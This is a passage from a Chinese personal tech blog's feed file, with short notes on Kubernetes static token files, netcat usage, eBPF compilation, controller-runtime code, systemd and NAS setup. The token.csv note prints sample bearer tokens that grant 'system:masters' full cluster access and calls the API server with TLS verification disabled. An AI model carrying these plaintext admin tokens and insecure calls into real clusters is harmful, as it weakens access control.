class="hljs-string">&quot;&#123;\&quot;test1bbbb\&quot;:\&quot;1\&quot;,\&quot;test2bbbb\&quot;:\&quot;2\&quot;&#125;&quot;</span><br>    <br>    <br>    // step3: 转成字符串<br>    cMarshal: json.Marshal(self.c)<br>    <br>    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202305) token.csv</title>
    <link href="/2023/05/08/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202305)%20token.csv/"/>
    <url>/2023/05/08/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202305)%20token.csv/</url>
    
    <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>token.csv<br>该文件为一个用户的描述文件，基本格式为 Token,用户名,UID,用户组；这个文件在 apiserver 启动时被 apiserver 加载，然后就相当于在集群内创建了一个这个用户；接下来就可以用 RBAC 给他授权</p><p>这些 token 的形式是 <code>[a-z0-9]&#123;6&#125;.[a-z0-9]&#123;16&#125;</code>。第一部分是 Token ID，第二部分是 Token Secret。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##### 1. apiserver的启动参数中添加</span><br>--token-auth-file=xxx/token.csv<br><br><span class="hljs-comment">##### 2. 查看内容</span><br><span class="hljs-comment"># cat token.csv </span><br>12ba4f.d82a57a4433b2359,<span class="hljs-string">&quot;system:admin&quot;</span>,10001,<span class="hljs-string">&quot;system:masters&quot;</span><br>12ba4f.d82a57a4433b2358,<span class="hljs-string">&quot;system:admin&quot;</span>,10001,<span class="hljs-string">&quot;system:admin&quot;</span><br><br><span class="hljs-comment">##### 3. 测试1：system:masters</span><br><span class="hljs-comment"># curl https://192.168.3.100:16941/api/v1/nodes  --header &quot;Authorization: Bearer 12ba4f.d82a57a4433b2359&quot; --insecure</span><br>&#123;<br>  <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;NodeList&quot;</span>,<br>  <span class="hljs-string">&quot;apiVersion&quot;</span>: <span class="hljs-string">&quot;v1&quot;</span>,<br>  <span class="hljs-string">&quot;metadata&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;resourceVersion&quot;</span>: <span class="hljs-string">&quot;5899&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;items&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;metadata&quot;</span>: &#123;<br>...<br><br><span class="hljs-comment">##### 3. 测试2：system:admin</span><br><span class="hljs-comment"># curl https://192.168.3.100:16941/api/v1/nodes  --header &quot;Authorization: Bearer 12ba4f.d82a57a4433b2358&quot; --insecure</span><br>&#123;<br>  <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;Status&quot;</span>,<br>  <span class="hljs-string">&quot;apiVersion&quot;</span>: <span class="hljs-string">&quot;v1&quot;</span>,<br>  <span class="hljs-string">&quot;metadata&quot;</span>: &#123;&#125;,<br>  <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;Failure&quot;</span>,<br>  <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;nodes is forbidden: User \&quot;system:admin\&quot; cannot list resource \&quot;nodes\&quot; in API group \&quot;\&quot; at the cluster scope&quot;</span>,<br>  <span class="hljs-string">&quot;reason&quot;</span>: <span class="hljs-string">&quot;Forbidden&quot;</span>,<br>  <span class="hljs-string">&quot;details&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;nodes&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;code&quot;</span>: 403<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>system:masters是k8s中最大权限的用户组，所以token文件中将用户写成system:masters可以获取到所有资源</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230509141802.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230509141852.png" alt="image.png"></p><h2 id="生成token的方式"><a href="#生成token的方式" class="headerlink" title="生成token的方式"></a>生成token的方式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span><br>/etc/kubernetes<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`head -c 16 /dev/urandom | od -An -t x | tr -d &#x27; &#x27;`,kubelet-bootstrap,10001,\&quot;system:kubelet-bootstrap\&quot;&quot;</span> &gt; token.csv<br><span class="hljs-built_in">cat</span> token.csv<br><br>也可以使用上面的命令在工作中生成随机字符串<br><span class="hljs-built_in">head</span> -c 16 /dev/urandom | <span class="hljs-built_in">od</span> -An -t x | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> BOOTSTRAP_TOKEN=$(<span class="hljs-built_in">head</span> -c 16 /dev/urandom | <span class="hljs-built_in">od</span> -An -t x | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-built_in">cat</span> &gt; token.csv &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">$&#123;BOOTSTRAP_TOKEN&#125;,kubelet-bootstrap,10001,&quot;system:kubelet-bootstrap&quot;</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># head -c 16 /dev/urandom | od -An -t x | tr -d &#x27; &#x27;</span><br>00f87bd9ae7cabc5f6da29534525f84f<br><span class="hljs-comment">## 数过了，32位</span><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/authentication/#static-token-file">k8s官网 用户认证</a><br><a href="https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/rbac/">k8s官网 使用 RBAC 鉴权</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】nc常用命令</title>
    <link href="/2023/05/06/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91nc%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/05/06/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91nc%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">-u, --udp                  Use UDP instead of default TCP<br>-v, --verbose              Set verbosity level (can be used several <span class="hljs-built_in">times</span>)     <br>-z                         Zero-I/O mode, report connection status only    <br>-l, --listen               Bind and listen <span class="hljs-keyword">for</span> incoming connections   <br>-w, --<span class="hljs-built_in">wait</span> &lt;time&gt;          Connect <span class="hljs-built_in">timeout</span> <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -vz -w3 11.254.0.1 443<br><br>nc -luv 0.0.0.0 53<br>nc -uv 0.0.0.0 53<br>nc -uvz 0.0.0.0 53<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ebpf】编译</title>
    <link href="/2023/05/04/ebpf/unsupported/%E3%80%90ebpf%E3%80%91%E7%BC%96%E8%AF%91/"/>
    <url>/2023/05/04/ebpf/unsupported/%E3%80%90ebpf%E3%80%91%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># uname -a</span><br>Linux ningan 5.4.0-147-generic <span class="hljs-comment">#164~18.04.1-Ubuntu SMP Tue Apr 4 00:20:20 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br><span class="hljs-comment"># cat /etc/os-release</span><br>NAME=<span class="hljs-string">&quot;Ubuntu&quot;</span><br>VERSION=<span class="hljs-string">&quot;18.04.6 LTS (Bionic Beaver)&quot;</span><br>ID=ubuntu<br>ID_LIKE=debian<br>PRETTY_NAME=<span class="hljs-string">&quot;Ubuntu 18.04.6 LTS&quot;</span><br>VERSION_ID=<span class="hljs-string">&quot;18.04&quot;</span><br>HOME_URL=<span class="hljs-string">&quot;https://www.ubuntu.com/&quot;</span><br>SUPPORT_URL=<span class="hljs-string">&quot;https://help.ubuntu.com/&quot;</span><br>BUG_REPORT_URL=<span class="hljs-string">&quot;https://bugs.launchpad.net/ubuntu/&quot;</span><br>PRIVACY_POLICY_URL=<span class="hljs-string">&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span><br>VERSION_CODENAME=bionic<br>UBUNTU_CODENAME=bionic<br><br></code></pre></td></tr></table></figure><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># clang -O2 -g -target bpf -c bpf_sockops.c -o bpf_sockops.o</span><br>In file included from bpf_sockops.c:1:<br>In file included from /usr/include/linux/bpf.h:11:<br>/usr/include/linux/types.h:5:10: fatal error: <span class="hljs-string">&#x27;asm/types.h&#x27;</span> file not found<br><span class="hljs-comment">#include &lt;asm/types.h&gt;</span><br>         ^~~~~~~~~~~~~<br>1 error generated.<br><br></code></pre></td></tr></table></figure><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># apt-get install -y gcc-multilib</span><br></code></pre></td></tr></table></figure><h2 id="参卡"><a href="#参卡" class="headerlink" title="参卡"></a>参卡</h2><p><a href="https://www.ghl.name/archives/how-to-fix-asm-types-h-no-found.html"># Debian下libbpf编译失败提示&lt;asm&#x2F;types.h&gt;文件不存在解决方法</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】k8s官网常用页面</title>
    <link href="/2023/04/28/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%AE%98%E7%BD%91%E5%B8%B8%E7%94%A8%E9%A1%B5%E9%9D%A2/"/>
    <url>/2023/04/28/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%AE%98%E7%BD%91%E5%B8%B8%E7%94%A8%E9%A1%B5%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/access-cluster-api/"># 使用 Kubernetes API 访问集群</a><br><a href="https://kubernetes.io/docs/reference/kubectl/generated/kubectl_cp/">kubectl cp | Kubernetes</a></p><p>&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;{namespace}&#x2F;pods<br>&#x2F;apis&#x2F;apps&#x2F;v1&#x2F;namespaces&#x2F;{namespace}&#x2F;replicasets</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】k8s官网常用页面</title>
    <link href="/2023/04/28/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%AE%98%E7%BD%91%E5%B8%B8%E7%94%A8%E9%A1%B5%E9%9D%A2/"/>
    <url>/2023/04/28/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%AE%98%E7%BD%91%E5%B8%B8%E7%94%A8%E9%A1%B5%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/access-cluster-api/"># 使用 Kubernetes API 访问集群</a></p><p>&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;{namespace}&#x2F;pods<br>&#x2F;apis&#x2F;apps&#x2F;v1&#x2F;namespaces&#x2F;{namespace}&#x2F;replicasets</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】client客户端</title>
    <link href="/2023/04/27/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91client%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
    <url>/2023/04/27/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91client%E5%AE%A2%E6%88%B7%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-string">&quot;sigs.k8s.io/controller-runtime/pkg/client&quot;</span><br><br><span class="hljs-keyword">type</span> Inodes <span class="hljs-keyword">struct</span> &#123;<br>client.Client<br>&#125;<br><br><br>inodesListExpect = xxxx <span class="hljs-comment">// 有具体值</span><br><br><br><span class="hljs-comment">// get</span><br>inodes := &amp;irov1.IaasNodes&#123;&#125;<br>err = c.Get(context.TODO(), types.NamespacedName&#123;Name: inodesExpect.Name, Namespace: inodesExpect.Namespace&#125;, inodes)<br><br><span class="hljs-comment">// 创建</span><br><span class="hljs-keyword">if</span> err = c.Create(context.TODO(), &amp;inodesExpect); err != <span class="hljs-literal">nil</span> &#123;<br>klog.ErrorS(err, <span class="hljs-string">&quot;Create iaasnodes err&quot;</span>, <span class="hljs-string">&quot;iaasnodes&quot;</span>, iNodeKey)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-comment">// 更新</span><br>inodesExpect.SetResourceVersion(inodes.GetResourceVersion()) <span class="hljs-comment">// 关联资源</span><br><span class="hljs-keyword">if</span> err = c.Update(context.TODO(), &amp;inodesExpect); err != <span class="hljs-literal">nil</span> &#123;<br>klog.ErrorS(err, <span class="hljs-string">&quot;Update iaasnodes err&quot;</span>, <span class="hljs-string">&quot;iaasnodes&quot;</span>, iNodeKey)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-comment">// list</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】client客户端</title>
    <link href="/2023/04/27/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91client%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
    <url>/2023/04/27/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91client%E5%AE%A2%E6%88%B7%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-string">&quot;sigs.k8s.io/controller-runtime/pkg/client&quot;</span><br><br><span class="hljs-keyword">type</span> Inodes <span class="hljs-keyword">struct</span> &#123;<br>client.Client<br>&#125;<br><br><br>inodesListExpect = xxxx <span class="hljs-comment">// 有具体值</span><br><br><br><span class="hljs-comment">// get</span><br>inodes := &amp;irov1.IaasNodes&#123;&#125;<br>err = c.Get(context.TODO(), types.NamespacedName&#123;Name: inodesExpect.Name, Namespace: inodesExpect.Namespace&#125;, inodes)<br><br><span class="hljs-comment">// 创建</span><br><span class="hljs-keyword">if</span> err = c.Create(context.TODO(), &amp;inodesExpect); err != <span class="hljs-literal">nil</span> &#123;<br>klog.ErrorS(err, <span class="hljs-string">&quot;Create iaasnodes err&quot;</span>, <span class="hljs-string">&quot;iaasnodes&quot;</span>, iNodeKey)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-comment">// 更新</span><br>inodesExpect.SetResourceVersion(inodes.GetResourceVersion()) <span class="hljs-comment">// 关联资源</span><br><span class="hljs-keyword">if</span> err = c.Update(context.TODO(), &amp;inodesExpect); err != <span class="hljs-literal">nil</span> &#123;<br>klog.ErrorS(err, <span class="hljs-string">&quot;Update iaasnodes err&quot;</span>, <span class="hljs-string">&quot;iaasnodes&quot;</span>, iNodeKey)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-comment">// list</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202304) 常用命令：systemd</title>
    <link href="/2023/04/26/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202304)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Asystemd/"/>
    <url>/2023/04/26/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202304)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Asystemd/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## 检查服务是否开机自启</span><br><span class="hljs-comment"># systemctl list-unit-files  |grep firewalld</span><br>firewalld.service                                                disabled <br><span class="hljs-comment"># systemctl is-enabled firewalld.service</span><br>disabled <br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/dlm_bk/article/details/117324881">https://blog.csdn.net/dlm_bk/article/details/117324881</a></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s错误解决系列】(202304)metadata.resourceVersion... must be specified for an update</title>
    <link href="/2023/04/24/k8s/%E3%80%90k8s%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91(202304)metadata.resourceVersion...%20must%20be%20specified%20for%20an%20update/"/>
    <url>/2023/04/24/k8s/%E3%80%90k8s%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91(202304)metadata.resourceVersion...%20must%20be%20specified%20for%20an%20update/</url>
    
    <content type="html"><![CDATA[<h1 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h1><p>The xxxx is invalid: metadata.resourceVersion: Invalid value: 0x0: must be specified for an update</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>getObj, err := dr.Get(obj.GetName(), metav1.GetOptions&#123;&#125;)<br><span class="hljs-keyword">if</span> errors.IsNotFound(err) &#123;<br>// This doesnt ever happen even <span class="hljs-keyword">if</span> it is already deleted or not found<br>log.Printf(<span class="hljs-string">&quot;%v not found&quot;</span>, obj.GetName())<br><span class="hljs-built_in">return</span> nil, nil<br>&#125;<br><br><span class="hljs-keyword">if</span> err != nil &#123;<br><span class="hljs-built_in">return</span> nil, err<br>&#125;<br><br>obj.SetResourceVersion(getObj.GetResourceVersion())<br><br>response, err := dr.Update(obj, metav1.UpdateOptions&#123;&#125;)<br><span class="hljs-keyword">if</span> err != nil &#123;<br><span class="hljs-built_in">return</span> nil, err<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/argoproj/argo-cd/issues/3657">https://github.com/argoproj/argo-cd/issues/3657</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【nas】nas初体验</title>
    <link href="/2023/04/22/nas/%E3%80%90nas%E3%80%91nas%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/2023/04/22/nas/%E3%80%90nas%E3%80%91nas%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/35c73430e00cc33ab5c7c9107a36c43.jpg" alt="35c73430e00cc33ab5c7c9107a36c43.jpg"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/4c87ad142cd052519e97a499726941b.jpg" alt="4c87ad142cd052519e97a499726941b.jpg"></p><p>连接电源和网线，将网线另一端接入路由器的lan口</p><h2 id="下载Synology-Assistant"><a href="#下载Synology-Assistant" class="headerlink" title="下载Synology Assistant"></a>下载Synology Assistant</h2><p>群晖助手Synology Assistant，下载安装：<a href="https://imnks.com/go/aHR0cHM6Ly9jbmRsLnN5bm9sb2d5LmNuL2Rvd25sb2FkL1V0aWxpdHkvQXNzaXN0YW50LzYuMi0yNDkyMi9XaW5kb3dzL3N5bm9sb2d5LWFzc2lzdGFudC02LjItMjQ5MjIuZXhl">Windows版本</a>，<a href="https://imnks.com/go/aHR0cHM6Ly9jbmRsLnN5bm9sb2d5LmNuL2Rvd25sb2FkL1V0aWxpdHkvQXNzaXN0YW50LzYuMi0yNDkyMi9NYWMvc3lub2xvZ3ktYXNzaXN0YW50LTYuMi0yNDkyMi5kbWc">Mac版本</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230422201931.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230422185322.png" alt="image.png"></p><p>点击“同意” “确定”</p><p>进行系统初始化</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230422201246.png" alt="image.png"></p><p>点击设置，选择手动安装</p><p><a href="https://www.synology.cn/zh-cn/support/download/DS119j?version=6.2#system">下载中心 - DS119j | Synology 群晖科技</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230422201848.png" alt="image.png"></p><p>安装完之后，基本信息如下</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513001652.png" alt="image.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://imnks.com/597.html">https://imnks.com/597.html</a></p><p><a href="https://imnks.com/mp/">https://imnks.com/mp/</a>   </p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【nas】nas常用术语</title>
    <link href="/2023/04/22/nas/%E3%80%90nas%E3%80%91nas%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/"/>
    <url>/2023/04/22/nas/%E3%80%90nas%E3%80%91nas%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/</url>
    
    <content type="html"><![CDATA[<p>白群晖</p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【nas】nas常用术语</title>
    <link href="/2023/04/22/nas/unsupported/%E3%80%90nas%E3%80%91nas%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/"/>
    <url>/2023/04/22/nas/unsupported/%E3%80%90nas%E3%80%91nas%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/</url>
    
    <content type="html"><![CDATA[<p>白群晖</p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【obsidian系列】05.obsidian中如何编辑表格？Markdown Table Editor</title>
    <link href="/2023/04/07/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9105.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E7%BC%96%E8%BE%91%E8%A1%A8%E6%A0%BC%EF%BC%9FMarkdown%20Table%20Editor/"/>
    <url>/2023/04/07/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9105.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E7%BC%96%E8%BE%91%E8%A1%A8%E6%A0%BC%EF%BC%9FMarkdown%20Table%20Editor/</url>
    
    <content type="html"><![CDATA[<h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>左下角设置 –&gt; 第三方插件 –&gt; 社区插件市场，搜索：Markdown Table Editor</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230509094257.png" alt="image.png"><br>点击安装</p><p>在下面的位置启用</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230509094333.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ebpf】BPF之巅-洞悉Linux系统和应用性能</title>
    <link href="/2023/04/06/ebpf/%E3%80%90ebpf%E3%80%91BPF%E4%B9%8B%E5%B7%85-%E6%B4%9E%E6%82%89Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E6%80%A7%E8%83%BD/"/>
    <url>/2023/04/06/ebpf/%E3%80%90ebpf%E3%80%91BPF%E4%B9%8B%E5%B7%85-%E6%B4%9E%E6%82%89Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E6%80%A7%E8%83%BD/</url>
    
